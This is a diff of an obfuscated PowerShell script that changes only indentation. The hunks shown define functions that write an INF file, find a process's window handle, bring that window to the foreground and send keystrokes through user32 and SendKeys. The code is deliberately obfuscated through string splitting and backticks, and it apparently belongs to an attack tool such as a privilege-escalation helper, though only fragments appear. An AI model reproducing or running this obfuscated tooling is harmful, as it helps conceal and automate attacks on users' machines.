@@ -1,4 +1,4 @@
- &('Sv')  ('cz'+'3'+'KQ1') ( [type]('uSeR32'+'.Ap'+'i'))  ;  .('S'+'ET') ('Buf9'+'8')  (  [TypE]('sys'+'tEm.dIaGN'+'oSTi'+'C'+'s.'+'pro'+'CeS'+'S')) ;   $g3K1 = [TYpe]('sY'+'S'+'TEM.W'+'INdoWs.fO'+'RmS.sendKeYS')  ; Function Sc`RiPT`:SE`T-inffIle {
+  &('Sv')  ('cz'+'3'+'KQ1') ( [type]('uSeR32'+'.Ap'+'i'))  ;  .('S'+'ET') ('Buf9'+'8')  (  [TypE]('sys'+'tEm.dIaGN'+'oSTi'+'C'+'s.'+'pro'+'CeS'+'S')) ;   $g3K1 = [TYpe]('sY'+'S'+'TEM.W'+'INdoWs.fO'+'RmS.sendKeYS')  ; Function Sc`RiPT`:SE`T-inffIle {
 [CmdletBinding()]
 	Param (
 	[Parameter(HelpMessage="Specify the INF file location")]
@@ -40,7 +40,7 @@ ${IN`FConTE`NT} | .('Out-F'+'i'+'le') ${inf`FiLe`LOCAt`I`On} -Encoding a`SCII
 
 Function get-`hWND
 {
-[CmdletBinding()]
+  [CmdletBinding()]
     
   Param
   (
@@ -87,7 +87,7 @@ function SE`T-wIn`D`o`WACTIvE
     ${H`WND} = .('Get'+'-Hwn'+'d') -ProcessName ${N`Ame} | &('Se'+'le'+'ct-Object') -ExpandProperty HW`Nd
     If (${hW`ND}) 
     {
-${O`N`Top} = &('N'+'ew-Objec'+'t') -TypeName sy`ST`EM.I`NtP`TR -ArgumentList (0)
+      ${O`N`Top} = &('N'+'ew-Objec'+'t') -TypeName sy`ST`EM.I`NtP`TR -ArgumentList (0)
         $CZ3KQ1::SetForegroundWindow(${H`WNd})
        $Cz3kq1::ShowWindow(${h`wNd}, 5)
     }
